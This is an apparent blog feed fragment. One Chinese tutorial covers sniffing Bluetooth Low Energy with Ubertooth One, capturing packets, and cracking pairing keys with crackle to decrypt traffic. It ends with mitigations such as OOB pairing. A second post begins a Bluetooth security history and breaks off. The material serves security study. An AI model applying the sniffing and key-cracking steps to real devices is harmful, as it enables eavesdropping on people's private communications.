    <id>http://www.ol4three.com/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/</id>
    <published>2020-10-14T07:17:42.000Z</published>
    <updated>2020-12-01T11:51:27.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-本机环境"><a href="#0x00-本机环境" class="headerlink" title="0x00 本机环境"></a>0x00 本机环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mac osx 10.15.5</span><br><span class="line">VMware Fusion 11.5.1</span><br><span class="line">Ubuntu 18.04</span><br><span class="line">Ubertooth One</span><br></pre></td></tr></table></figure><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><h3 id="1-安装lib库"><a href="#1-安装lib库" class="headerlink" title="1. 安装lib库"></a>1. 安装lib库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-software-properties</span><br><span class="line">add-apt-repository ppa:pyside</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install libnl-3-dev libusb-1.0-0-dev pyside-tools</span><br></pre></td></tr></table></figure><h3 id="2-安装libbtbb"><a href="#2-安装libbtbb" class="headerlink" title="2. 安装libbtbb"></a>2. 安装libbtbb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;greatscottgadgets&#x2F;libbtbb&#x2F;archive&#x2F;2015-09-R2.tar.gz -O libbtbb-2015-09-R2.tar.gz</span><br><span class="line">tar xf libbtbb-2015-09-R2.tar.gz</span><br><span class="line">cd libbtbb-2015-09-R2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="3-安装ubertooth"><a href="#3-安装ubertooth" class="headerlink" title="3. 安装ubertooth"></a>3. 安装ubertooth</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ubertooth</span><br></pre></td></tr></table></figure><blockquote><p>报错安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure></blockquote><h3 id="4-安装wireshark"><a href="#4-安装wireshark" class="headerlink" title="4. 安装wireshark"></a>4. 安装wireshark</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wireshark</span><br></pre></td></tr></table></figure><h3 id="5-安装kismet"><a href="#5-安装kismet" class="headerlink" title="5. 安装kismet"></a>5. 安装kismet</h3><h4 id="a-直接安装"><a href="#a-直接安装" class="headerlink" title="a. 直接安装"></a>a. 直接安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ckermit </span><br></pre></td></tr></table></figure><p>在~中创建.kermrc，然后输入如下配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set line          &#x2F;dev&#x2F;ttyUSB0  </span><br><span class="line">set speed         115200  </span><br><span class="line">set carrier-watch off  </span><br><span class="line">set handshake     none  </span><br><span class="line">set flow-control none  </span><br><span class="line">robust  </span><br><span class="line">set file type     bin  </span><br><span class="line">set file name     lit  </span><br><span class="line">set rec pack      1000  </span><br><span class="line">set send pack     1000  </span><br><span class="line">set window        5  </span><br></pre></td></tr></table></figure><h4 id="b-编译安装"><a href="#b-编译安装" class="headerlink" title="b. 编译安装"></a>b. 编译安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;kismetwireless.net&#x2F;code&#x2F;kismet-2020-09-R1.tar.xz</span><br><span class="line">tar xf kismet-2020-09-R1.tar.xz</span><br><span class="line">cd kismet-2020-09-R1</span><br><span class="line">ln -s ..&#x2F;ubertooth-2015-09-R2&#x2F;host&#x2F;kismet&#x2F;plugin-ubertooth .</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp;&amp; make plugins</span><br><span class="line">sudo make suidinstall</span><br><span class="line">sudo make plugins-install</span><br></pre></td></tr></table></figure><blockquote><p>报错安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ncurses-dev</span><br><span class="line">sudo apt-get install libpcap-dev</span><br><span class="line">sudo apt-get install libz-dev</span><br><span class="line">sudo apt-get install libmicrohttpd-dev</span><br><span class="line">sudo apt-get install libsqlite3-dev</span><br></pre></td></tr></table></figure></blockquote><p>找到kismet的配置文件kismet.conf ，把”pcapbtbb”加入到kismet.conf的logtypes= 里边</p><h3 id="6-安装BLE解密工具crackle"><a href="#6-安装BLE解密工具crackle" class="headerlink" title="6. 安装BLE解密工具crackle"></a>6. 安装BLE解密工具crackle</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mikeryan&#x2F;crackle.git</span><br><span class="line">cd crackle</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="0x02-嗅探扫描"><a href="#0x02-嗅探扫描" class="headerlink" title="0x02 嗅探扫描"></a>0x02 嗅探扫描</h2><h3 id="1-Spectool"><a href="#1-Spectool" class="headerlink" title="1. Spectool"></a>1. Spectool</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install spectools</span><br></pre></td></tr></table></figure><h4 id="a-spectool-curses"><a href="#a-spectool-curses" class="headerlink" title="a. spectool_curses"></a>a. spectool_curses</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015092657632.png" alt="image-20201015092657632"></p><h4 id="b-spectool-gtk"><a href="#b-spectool-gtk" class="headerlink" title="b. spectool_gtk"></a>b. spectool_gtk</h4><p>扫描附近信号在频谱上显示</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015093808357.png" alt="image-20201015093808357"></p><h4 id="c-spectool-raw"><a href="#c-spectool-raw" class="headerlink" title="c. spectool_raw"></a>c. spectool_raw</h4><p>RAW中文的解释是“原材料”或“未经过处理的东西”，这里猜测是显示设备捕获到的未经处理的信号数据：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094038013.png" alt="image-20201015094038013"></p><h4 id="d-spectool-net"><a href="#d-spectool-net" class="headerlink" title="d. spectool_net"></a>d. spectool_net</h4><p>将Ubertooth One作为一台“硬件服务器”，并监听TCP：30569端口，局域网内任何可以跟主机建立通信的PC可通过Ubertoothe主机IP+30569共享设备。连接方式：在另外一台主机终端上执行：spectool_gtk</p><p>—&gt;选择Open Network Device —&gt;输入ip、端口</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094733056.png" alt="image-20201015094733056"></p><h3 id="2-Hcitool"><a href="#2-Hcitool" class="headerlink" title="2. Hcitool"></a>2. Hcitool</h3><p>hcitool –help</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">hcitool - HCI Tool ver 5.48</span><br><span class="line">Usage:</span><br><span class="line">hcitool [options] &lt;command&gt; [command parameters]</span><br><span class="line">Options:</span><br><span class="line">--helpDisplay help</span><br><span class="line">-i devHCI device</span><br><span class="line">Commands:</span><br><span class="line">dev Display local devices</span><br><span class="line">inq Inquire remote devices</span><br><span class="line">scanScan for remote devices</span><br><span class="line">nameGet name from remote device</span><br><span class="line">infoGet information from remote device</span><br><span class="line">spinqStart periodic inquiry</span><br><span class="line">epinqExit periodic inquiry</span><br><span class="line">cmd Submit arbitrary HCI commands</span><br><span class="line">con Display active connections</span><br><span class="line">cc  Create connection to remote device</span><br><span class="line">dc  Disconnect from remote device</span><br><span class="line">sr  Switch master&#x2F;slave role</span><br><span class="line">cpt Change connection packet type</span><br><span class="line">rssiDisplay connection RSSI</span><br><span class="line">lq  Display link quality</span><br><span class="line">tpl Display transmit power level</span><br><span class="line">afh Display AFH channel map</span><br><span class="line">lp  Set&#x2F;display link policy settings</span><br><span class="line">lst Set&#x2F;display link supervision timeout</span><br><span class="line">authRequest authentication</span><br><span class="line">enc Set connection encryption</span><br><span class="line">key Change connection link key</span><br><span class="line">clkoffRead clock offset</span><br><span class="line">clockRead local or remote clock</span><br><span class="line">lescanStart LE scan</span><br><span class="line">leinfoGet LE remote information</span><br><span class="line">lewladdAdd device to LE White List</span><br><span class="line">lewlrmRemove device from LE White List</span><br><span class="line">lewlszRead size of LE White List</span><br><span class="line">lewlclrClear LE White List</span><br><span class="line">lerladdAdd device to LE Resolving List</span><br><span class="line">lerlrmRemove device from LE Resolving List</span><br><span class="line">lerlclrClear LE Resolving List</span><br><span class="line">lerlszRead size of LE Resolving List</span><br><span class="line">lerlonEnable LE Address Resolution</span><br><span class="line">lerloffDisable LE Address Resolution</span><br><span class="line">leccCreate a LE Connection</span><br><span class="line">ledcDisconnect a LE Connection</span><br><span class="line">lecupLE Connection Update</span><br><span class="line"></span><br><span class="line">For more information on the usage of each command use:</span><br><span class="line">hcitool &lt;command&gt; --help</span><br></pre></td></tr></table></figure><p>hcitool scan :扫描附近蓝牙设备</p><p>hcitool lescan :扫描附近低功耗蓝牙设备</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015095601031.png" alt="image-20201015095601031"></p><h3 id="3-Gatttool"><a href="#3-Gatttool" class="headerlink" title="3. Gatttool"></a>3. Gatttool</h3><p> gatttool -h</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --help                                Show help options</span><br><span class="line">  --help-all                                Show all help options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services&#x2F;Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value&#x2F;Descriptor Read&#x2F;Write arguments</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter&#x3D;hciX                        Specify local adapter interface</span><br><span class="line">  -b, --device&#x3D;MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type&#x3D;[public | random]         Set LE address type. Default: public</span><br><span class="line">  -m, --mtu&#x3D;MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm&#x3D;PSM                             Specify the PSM for GATT&#x2F;ATT over BR&#x2F;EDR</span><br><span class="line">  -l, --sec-level&#x3D;[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br></pre></td></tr></table></figure><p>gatttool -b EC:F3:42:B2:DF:24 -I</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015100005087.png" alt="image-20201015100005087"></p><h3 id="4-Ubertooth-scan-s"><a href="#4-Ubertooth-scan-s" class="headerlink" title="4. Ubertooth-scan -s"></a>4. Ubertooth-scan -s</h3><p>sudo apt install ubertooth</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104856092.png" alt="image-20201015104856092"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104915904.png" alt="image-20201015104915904"></p><h3 id="5-Ubertooth-ble"><a href="#5-Ubertooth-ble" class="headerlink" title="5. Ubertooth-ble"></a>5. Ubertooth-ble</h3><pre><code>ubertooth-btle - passive Bluetooth Low Energy monitoringUsage:    -h this help    Major modes:    -f follow connections    -p promiscuous: sniff active connections    -a[address] get/set access address (example: -a8e89bed6)    -s&lt;address&gt; faux slave mode, using MAC addr (example: -s22:44:66:88:aa:cc)    -t&lt;address&gt; set connection following target (example: -t22:44:66:88:aa:cc)    Interference (use with -f or -p):    -i interfere with one connection and return to idle    -I interfere continuously    Data source:    -U&lt;0-7&gt; set ubertooth device to use    Misc:    -r&lt;filename&gt; capture packets to PCAPNG file    -q&lt;filename&gt; capture packets to PCAP file (DLT_BLUETOOTH_LE_LL_WITH_PHDR)    -c&lt;filename&gt; capture packets to PCAP file (DLT_PPI)    -A&lt;index&gt; advertising channel index (default 37)    -v[01] verify CRC mode, get status or enable/disable    -x&lt;n&gt; allow n access address offenses (default 32)If an input file is not specified, an Ubertooth device is used for live capture.In get/set mode no capture occurs.</code></pre><blockquote><p>ubertooth-btle -f -c test.pcap抓包&amp;保存到本地</p></blockquote><p>使用这条命令我们可以把设备捕获到的数据包保存到本地，完成后可导入wireshark进行数据包、协议分析。</p><p>wireshark导入嗅探到的蓝牙数据包需要处理一下才能正常查看，不然无法正常分析数据：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113803864.png" alt="image-20201015113803864"></p><p>Edit → Preferences → Protocols → DLT_USER → Edit → New</p><p>在payload protocol中输入btle</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015110349788.png" alt="image-20201015110349788"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113903595.png" alt="image-20201015113903595"></p><p>使用规则过滤数据包：参考<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">Capturing BLE in Wireshark</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btle.data_header.length &gt; 0 || btle.advertising_header.pdu_type &#x3D;&#x3D; 0x05</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015114932731.png" alt="image-20201015114932731"></p><h3 id="6-crackle"><a href="#6-crackle" class="headerlink" title="6. crackle"></a>6. crackle</h3><p>如果捕获到足够的数据包尤其是btsmp，抓到包之后我们最关心的问题是我们有没有抓到的足够的包来破解tk。所以在wireshark中你可以在filter处加上btsmp，确保抓到了我们需要的6个包。，那接下来便可以用crackle来破解tk和ltk：</p><p><strong>做到这个点尝试了身边的一些设备的连接没抓到大量包没有至少6个btsmp之后实践中碰到补足图片</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115144837.png" alt="image-20201015115144837"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从上图中我们可以看到我们不但破解了tk，还利用利用tk和其它一些数据成功的还原出了ltk。</span><br><span class="line"></span><br><span class="line">接下来我们再来试试利用获取的ltk来破解其他的加密包。假设我们在配对过程中已经拿到了ltk&#x3D;7f62c053f104a5bbe68b1d896a2ed49c</span><br></pre></td></tr></table></figure><p>解密数据包，并把解密后的包另存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;output.pcap&gt;</span><br><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;out.pcap&gt; -l &lt;ltk&gt;</span><br><span class="line"></span><br><span class="line">crackle -l 7f62c053f104a5bbe68b1d896a2ed49c -i test44.pcap -o test66.pcap</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115842434.png" alt="image-20201015115842434"></p><p>可以看到成功破解了7个包</p><h2 id="0x03-解决方案"><a href="#0x03-解决方案" class="headerlink" title="0x03 解决方案"></a>0x03 解决方案</h2><h4 id="1-使用OOB"><a href="#1-使用OOB" class="headerlink" title="1. 使用OOB"></a>1. 使用OOB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[email protected]:~&#x2F;Desktop# crackle -i heart.pcap </span><br><span class="line">Warning: No output file specified. Won&#39;t decrypt any packets.</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: already saw two random values, skipping</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">TK not found, the connection is probably using OOB pairing</span><br><span class="line">Sorry d00d :(</span><br></pre></td></tr></table></figure><h4 id="2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）"><a href="#2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）" class="headerlink" title="2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）"></a>2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）</h4><h2 id="0x04-参考："><a href="#0x04-参考：" class="headerlink" title="0x04 参考："></a>0x04 参考：</h2><p><a href="http://www.vuln.cn/6083">http://www.vuln.cn/6083</a></p><p><a href="https://blog.csdn.net/charmve/article/details/107170250">https://blog.csdn.net/charmve/article/details/107170250</a></p><p><a href="https://www.freebuf.com/articles/wireless/106298.html">路人甲@乌云drops:Bluetooth Low Energy 嗅探</a></p><p><a href="http://j2abro.blogspot.com.au/2014/06/understanding-bluetooth-advertising.html">疯狗@乌云drops：物联网安全拔“牙”实战——低功耗蓝牙（BLE）初探</a></p><p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a></p><p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-本机环境&quot;&gt;&lt;a href=&quot;#0x00-本机环境&quot; class=&quot;headerlink&quot; title=&quot;0x00 本机环境&quot;&gt;&lt;/a&gt;0x00 本机环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="BLE" scheme="http://www.ol4three.com/tags/BLE/"/>
    
      <category term="Ubertooth one" scheme="http://www.ol4three.com/tags/Ubertooth-one/"/>
    
      <category term="SDK" scheme="http://www.ol4three.com/tags/SDK/"/>
    
  </entry>
  
  <entry>
    <title>蓝牙安全以及相关漏洞研究</title>
    <link href="http://www.ol4three.com/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <id>http://www.ol4three.com/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</id>
    <published>2020-09-24T09:39:19.000Z</published>
    <updated>2020-12-02T06:40:04.886Z</updated>
    
    <content type="html"><![CDATA[<p>放大佬总结的一张图：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/BLE%E5%AE%89%E5%85%A8.png" alt="BLE安全"></p><p>蓝牙是一种无线通信标准，工作在2.4～2.485Ghz的ISM频段，主要用于短距离的数据连接，可以建立所谓的PAN(Personal Area Network)网络。蓝牙设备最常见的应用是各种以手机和电脑为中心的外围设备，例如与手机配合使用的蓝牙耳机、手机与汽车音响的互联、蓝牙键盘和鼠标等。</p><h2 id="0x00-蓝牙技术简介"><a href="#0x00-蓝牙技术简介" class="headerlink" title="0x00 蓝牙技术简介"></a><strong>0x00 蓝牙技术简介</strong></h2><p>蓝牙”，即Bluetooth，是斯堪的纳维亚语中 Blåtand / Blåtann 的英化版本。该词是十世纪的一位国王Harald Bluetooth的绰号，相传他将纷争不断的丹麦部落统一为一个王国，并引入了基督教。蓝牙技术开发者Jim Kardach于1997年提出用Bluetooth这个名词，据说他当时正在读一本名为The Long Ships的小说，讲述的就是维京人和Harald Bluetooth国王的故事。他认为蓝牙可以把各种不同的通信协议统一在一起，诚如这位国王做的事情一样。至于蓝牙的logo，取自国王Harald Bluetooth名字中的【H】和【B】两个字母的组合，用古北欧文字来表示：</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/33981.png" alt="0"></p><p>蓝牙技术最早是1994年由爱立信发明的，最初的目的是用无线连接来代替RS-232线缆连接。目前蓝牙标准由Bluetooth Special Interest Group (SIG) 组织管理。这一组织有超过25000个成员公司，分布在电信、计算机、网络和消费电子领域。</p><p>蓝牙工作在2.4～2.485GHz频段，有79个频道，每个频道占据1MHz宽带。因为2.4GHz的ISM频段是非常繁忙的，为了对抗其他系统的干扰，蓝牙采取跳频式的扩频技术，通常1秒钟跳跃1600次。BLE(Bluetooth Low Energy)只有40个频道，每个频道占据2MHz宽带.</p><p>蓝牙是一种基于数据包通信的协议，使用主-从式的网络结构。在一个piconet中，1个主节点可以与多达7个从节点通信。所有的设备都共享主节点的时钟。数据包以312.5us的间隔互相交换，这个时间成为clock tick。两个clock tick构成一个625us的时隙，两个时隙构成一个1250us的时隙对。一种比较简单的时隙配置是，主节点在偶数时隙发送数据包，在奇数时隙接受数据包；从节点相反，在偶数时隙接受数据包，在奇数时隙发送数据包。这里讨论的是经典的蓝牙协议，BLE的空中接口协议与经典的蓝牙协议有很大的不同。蓝牙协议还支持多个piconet连接在一起，组成scatternet。在这种情况下，某些设备可以在一个piconet中担任主节点，在离另一个piconet中知识从节点。</p><p>蓝牙技术已经发展了很多年，蓝牙规范有很多个版本，从最早的蓝牙1.0到2014年发布的蓝牙4.2。早期的蓝牙标准只能支持几百Kbps的传输速率，而到了蓝牙3.0版本，已经可以支持最高24Mbps的传输速度。蓝牙4.0版本引入了BLE协议，即低功耗蓝牙，其功耗非常低，可以使设备的电池维持很长的时间，因此在很多可穿戴设备中得到了应用。</p><p>一文读懂蓝牙技术从 1.0 到 5.0 的前世今生                                  (<a href="https://zhuanlan.zhihu.com/p/37725574">https://zhuanlan.zhihu.com/p/37725574</a>)</p><h2 id="0x01-蓝牙安全概述"><a href="#0x01-蓝牙安全概述" class="headerlink" title="0x01 蓝牙安全概述"></a><strong>0x01 蓝牙安全概述</strong></h2><p>蓝牙协议有加密和鉴权功能。蓝牙的密钥产生是基于蓝牙的PIN码的。PIN码需要输入到蓝牙设备中，或者出场时就已经写入设备里。在美国国家标准技术研究所官网上有一份蓝牙安全指南Guide to Bluetooth Security(<a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。</a></p><p>2001年，内尔实验室的Jakobsson和Wetzel发现了蓝牙配对协议中的缺陷，以及加密方法中的漏洞。2003年，A.L.Digital公司的两位研究人员Ben和Adam Laurie发现，在一些蓝牙产品中有严重的漏洞，能够导致个人隐私数据的泄漏。于是，接下来就出现了一种利用这种BlueBug攻击手法，开始展现出这一漏洞的危害性</p><p>2004年，第一个所谓的蓝牙病毒出现，它可以在Symbian操作系统的手机中传播。这个”病毒”是一个名叫”29A”的团队编写的PoC程序，写出来之后就交给了反病毒机构，因此它具有威胁性，但并没有真正的传播过。2004年8月，一项实验创纪录地把蓝牙连接的距离增加到了1.79公里，在实验中使用了方向性天线和功率放大器。这就增加了蓝牙病毒的危险性，使得它能够威胁到距离非常远的蓝牙设备</p><p>2005年1月，出现了一种名为”Lasco.A”的手机蠕虫病毒，也是针对Symbian手机的。用户一旦通过蓝牙接收这个病毒文件，病毒就会自动地安装在系统中，然后开始寻找周围其他的蓝牙设备去感染。另外这种病毒还能感染系统中的其他SIS文件。最终的后果是导致手机系统不稳定。</p><p>2005 年4月，剑桥大学的安全研究人员公布了他们发现的一种被动式攻击方式， 能够攻击基于PIN码的配对协议。这种攻击方式操作起来非常快，证实了蓝牙的对称密钥的建立方法是有缺陷的。为了抵御这种攻击，研究人员提出了-种更强的非对称密钥加密方法。</p><p>2005年6月，Yaniv Shaked和Avishai Wool发表了一篇论文，提出了被动式和主动式两种攻击方式，可以获得PIN码。在被动式攻击中，攻击者在蓝牙设备初始配对的时刻就能窃听到通信的内容:而主动式攻击则需要在某个特定的时刻发出一-种特殊构造的数据包，使主节点和从节点重复配对过程，之后就可以使用被动式攻击在配对过程中侦听密钥了。这种攻击的主要弱点在于，它需要受到攻击的用户在攻击期间重新输入PIN码，此时设备会有提示。另外，这种攻击还需要一些特别的设备在恰当的时刻发出一种特殊构造的数据包，现成的蓝牙芯片是不.能做到这一- 点的。</p><p>蓝牙地址还可以用于追踪设备的位置。2005 年8月，英格兰剑桥郡的警方发出警示说，有些小偷利用蓝牙来探查车内是否有被遗忘的手机或电脑等设备，提示人们在不使用蓝牙功能时尽量关闭它。</p><p>2006年4月，来自Secure Network和F-Secure的研究人员发布了一份报告，警告有大量留在“可见”状态的设备，还报告了各种蓝牙服务的普及程度，以及与蓝牙蠕虫传播的危险性有关的统计数据。</p><p>2007年10月，在卢森堡的Hack.lu Security会议上，Kevin Finistere和Thiery Zoller演示了通过蓝牙远程rootMacOSXv10.3.9和v10.4系统，还演示了一个蓝牙PIN码和Linkeys破解器。</p><p>维基百科.上介绍的以上这些蓝牙安全的案例都至少是9年以前的事情了。那么近些年来，在蓝牙安全领域又有什么攻击方式</p><h2 id="0x02-BLE工作流程"><a href="#0x02-BLE工作流程" class="headerlink" title="0x02 BLE工作流程"></a><strong>0x02 BLE工作流程</strong></h2><h3 id="1-工作流程"><a href="#1-工作流程" class="headerlink" 